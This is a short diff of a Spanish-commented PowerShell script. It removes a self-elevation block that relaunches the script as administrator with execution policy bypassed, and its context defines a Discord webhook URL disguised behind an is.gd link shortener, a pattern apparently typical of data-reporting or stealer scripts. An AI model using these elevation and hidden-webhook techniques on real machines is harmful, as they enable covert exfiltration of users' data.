@@ -1,10 +1,3 @@
-# Verificar si el script se está ejecutando con privilegios elevados (como administrador)
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados y ejecución de scripts habilitada
-    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    Exit
-}
-
 # Definir la URL del webhook de Discord
 $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
